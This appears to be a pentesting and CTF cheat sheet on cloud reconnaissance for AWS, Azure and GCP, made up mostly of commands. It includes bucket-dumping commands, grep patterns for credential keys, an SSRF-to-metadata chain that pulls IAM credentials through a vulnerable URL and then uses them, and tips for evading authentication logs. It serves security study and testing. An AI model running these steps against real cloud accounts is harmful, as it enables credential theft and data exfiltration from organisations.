# Cloud Recon & Enum

## **Cloud Reconnaissance & Enumeration — Hunting in the Cloud**

***

Cloud environments are the **new perimeter** — sprawling networks of APIs, storage buckets, virtual machines, IAM roles, and serverless functions.\
Understanding how to enumerate, map, and exploit cloud assets is critical for both CTF success and real-world pentesting.

This guide breaks down cloud reconnaissance into **AWS**, **Azure**, and **GCP** workflows, covering **open-source intel**, **credential abuse**, and **service enumeration**.

***

### I. 🧩 Core Cloud Enumeration Concepts

| Concept                                | Description                                               |
| -------------------------------------- | --------------------------------------------------------- |
| **Tenant / Subscription**              | Account scope within a cloud provider.                    |
| **IAM (Identity & Access Management)** | Role/Policy system for authentication and authorization.  |
| **Service Principal**                  | Machine identity used for automation and APIs.            |
| **Storage Buckets**                    | Public/private object storage (e.g. S3, Blob, GCS).       |
| **Cloud Metadata**                     | Internal endpoint exposing instance info and credentials. |
| **API Keys & Tokens**                  | Authentication keys for accessing cloud services.         |

***

### II. ⚙️ Passive Cloud Recon (OSINT Phase)

Passive cloud reconnaissance is your stealth layer — no direct interaction with the target’s cloud.

#### 🧠 1. Identify Cloud Providers

```bash
dig example.com
```

Look for patterns:

```
s3.amazonaws.com → AWS
blob.core.windows.net → Azure
storage.googleapis.com → GCP
```

#### ⚙️ 2. Search Exposed Buckets

```bash
site:s3.amazonaws.com example
site:blob.core.windows.net example
site:storage.googleapis.com example
```

#### 🧩 3. Code & Repo Enumeration

```bash
gh search "AWS_SECRET_ACCESS_KEY" user:targetorg
```

or use:

```bash
trufflehog github --org targetorg
```

#### ⚙️ 4. Public Artifacts

* Terraform configs
* CloudFormation templates
* `.env` files
* `config.json` with keys

***

### III. 🧠 Cloud Metadata Enumeration (Local Discovery)

If you get access to a cloud instance → enumerate internal metadata services.

#### ⚙️ AWS EC2

```bash
curl http://169.254.169.254/latest/meta-data/
```

#### 🧩 Azure VM

```bash
curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

#### ⚙️ GCP

```bash
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/
```

These endpoints can expose:

* IAM role names
* Access tokens
* Instance details
* Cloud API credentials

***

### IV. ☁️ AWS Reconnaissance

#### 🧠 1. Identify Public Buckets

```bash
aws s3 ls s3://target-bucket --no-sign-request
```

or with `s3scanner`:

```bash
s3scanner --bucket target-bucket
```

#### ⚙️ 2. Enumerate S3 Buckets Automatically

```bash
aws s3 ls | awk '{print $3}'
```

#### 💣 3. Dump Files from Public Bucket

```bash
aws s3 sync s3://target-bucket ./loot --no-sign-request
```

***

#### 🧩 4. IAM Enumeration (Using Keys)

```bash
aws sts get-caller-identity
aws iam list-users
aws iam list-roles
aws iam list-policies
```

#### ⚙️ 5. Enumerate EC2 & Networking

```bash
aws ec2 describe-instances --region us-east-1
aws ec2 describe-security-groups
```

#### 💣 6. Sensitive Data Search

```bash
aws s3api list-objects --bucket target-bucket --output text | grep key
```

Look for:

```
keys/
secrets/
credentials.json
.env
```

***

#### 🧠 7. Misconfigurations to Exploit

| Issue                 | Description             | Exploit                  |
| --------------------- | ----------------------- | ------------------------ |
| Public S3 Bucket      | Open read/write access  | Data theft / file upload |
| Exposed Access Key    | Found in code or config | Use via AWS CLI          |
| Overly-Permissive IAM | Wildcards in policies   | Privilege escalation     |
| EC2 Metadata Access   | SSRF → Role credentials | Enumerate via curl       |

***

### V. ⚙️ Azure Reconnaissance

#### 🧩 1. Enumerate Public Blob Containers

```bash
https://<account>.blob.core.windows.net/<container>/
```

Try browsing or appending `?comp=list`.

#### ⚙️ 2. Azure Storage Scanner

```bash
python3 azure-scanner.py -d example.com
```

#### 🧠 3. Azure CLI Enumeration

```bash
az account show
az ad user list
az ad sp list
az storage account list
az keyvault list
```

#### ⚙️ 4. Azure Key Vault Access

```bash
az keyvault secret list --vault-name targetvault
```

***

### VI. ☁️ GCP Reconnaissance

#### 🧩 1. Identify Open Buckets

```bash
gsutil ls gs://target-bucket
```

#### ⚙️ 2. Dump Files from Public Bucket

```bash
gsutil -m cp -r gs://target-bucket ./loot
```

#### 🧠 3. GCP CLI Enumeration

```bash
gcloud projects list
gcloud iam service-accounts list
gcloud storage buckets list
```

#### ⚙️ 4. Check Cloud Functions & APIs

```bash
gcloud functions list
gcloud services list --enabled
```

***

### VII. 💣 Cloud API Key Identification

Search patterns in source, JS, or config files:

```bash
grep -rni "AKIA" .
grep -rni "AIza" .
grep -rni "EAACEdEose0cBA" .
```

| Provider     | Key Pattern         | Description     |
| ------------ | ------------------- | --------------- |
| **AWS**      | `AKIA...`           | Access Key ID   |
| **GCP**      | `AIza...`           | API Key         |
| **Facebook** | `EAACEdEose0cBA...` | Graph API Token |
| **Slack**    | `xoxb-`, `xoxp-`    | Bot/User Tokens |
| **Stripe**   | `sk_live_`          | Secret API Key  |

***

### VIII. 🧩 Cloud Infrastructure Mapping

#### ⚙️ DNS & CDN Fingerprints

```bash
dig target.com
```

Look for:

```
cloudfront.net → AWS CloudFront
azureedge.net → Azure CDN
googleusercontent.com → GCP CDN
```

#### 🧠 IP Analysis

```bash
whois <ip>
```

Reveals:

* AWS (Amazon Technologies Inc.)
* Microsoft Azure
* Google Cloud

***

### IX. ⚙️ Hybrid Cloud Enumeration Pipeline

```bash
# 1. Passive discovery
subfinder -d target.com -silent | httpx -silent -o live.txt

# 2. Detect Cloud Services
cat live.txt | nuclei -t cloud/

# 3. Enumerate Buckets
s3scanner --bucket target
python3 azure-scanner.py -d target.com
gsutil ls gs://target-bucket

# 4. Validate Keys
trufflehog file ./code/
detect-secrets scan ./src/
```

***

### X. ⚙️ SSRF to Cloud Metadata Exploitation

#### 🧠 Example

If SSRF found on AWS:

```bash
curl -G "http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

Retrieve temporary credentials:

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

Then use them:

```bash
aws configure
# Paste access + secret keys + session token
aws s3 ls
```

***

### XI. ⚙️ Secrets in CI/CD & Infrastructure

Look for:

* `.github/workflows/` with keys
* `.gitlab-ci.yml` with tokens
* Jenkins pipelines exporting environment vars

#### ⚙️ Detect Automatically

```bash
trufflehog filesystem --directory ./repo/
detect-secrets scan ./src/
```

***

### XII. ⚙️ Misconfiguration Exploitation Matrix

| Misconfig         | Description                     | Tool                                      |
| ----------------- | ------------------------------- | ----------------------------------------- |
| Public S3 Bucket  | Anonymous read/write            | `aws s3 ls s3://target --no-sign-request` |
| Leaked Keys       | Found in repos or logs          | `aws sts get-caller-identity`             |
| Metadata SSRF     | Local metadata endpoint exposed | `curl 169.254.169.254`                    |
| Azure Blob Access | Open containers                 | Browser / curl                            |
| GCP Bucket        | World-readable bucket           | `gsutil ls`                               |

***

### XIII. ⚔️ Pro Tips & Red Team Tricks

✅ **Cross-Pivoting**

* Use cloud storage findings to pivot into on-prem systems (via creds or configs).

✅ **Automation**

* Combine `subfinder`, `httpx`, and `nuclei -t cloud` to auto-detect public assets.

✅ **Avoid Detection**

* Use public resolvers and the `--no-sign-request` flag to avoid authentication logs.

✅ **Loot Everything**

* `.env`, `.json`, `.pem`, `.p12`, `.yaml`, `.boto`, `.dockerconfigjson` → gold.

✅ **Cloud + Web**

* Many RCEs → metadata endpoint → AWS creds → full cloud compromise.

***

### XIV. ⚙️ Quick Reference Table

| Provider        | Tool / Command                                    | Use                     |
| --------------- | ------------------------------------------------- | ----------------------- |
| **AWS**         | `aws s3 ls s3://bucket --no-sign-request`         | List public S3 buckets  |
|                 | `aws iam list-users`                              | Enumerate IAM users     |
| **Azure**       | `az storage account list`                         | List storage            |
|                 | `az keyvault list`                                | Key Vault enumeration   |
| **GCP**         | `gsutil ls gs://bucket`                           | List GCP buckets        |
|                 | `gcloud iam service-accounts list`                | List service accounts   |
| **Multi-cloud** | `trufflehog`, `detect-secrets`, `nuclei -t cloud` | Key & service detection |

***
